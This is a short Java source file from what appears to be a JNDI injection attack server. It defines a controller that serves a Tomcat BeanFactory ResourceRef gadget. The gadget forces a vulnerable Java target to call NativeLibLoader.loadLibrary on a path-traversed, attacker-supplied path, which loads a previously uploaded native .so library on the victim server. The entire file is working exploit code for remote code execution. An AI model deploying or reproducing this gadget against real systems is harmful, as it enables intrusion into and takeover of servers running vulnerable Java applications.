package cn.butler.jndi.controller;

import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/**
 * com.sun.glass.utils.NativeLibLoader本地加载so文件需要我们向目标服务器上传二进制文件
 */
@JNDIController
@JNDIMapping("/NativeLibLoader")
public class NativeLibLoaderController implements Controller {
    public Object process(String path) {
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../" + path));
        return ref;
    }

    @JNDIMapping("/{path}")
    public String loadLibrary(String path) {
        System.out.println("[NativeLibLoader] Library Path: " + path);
        return path;
    }
}
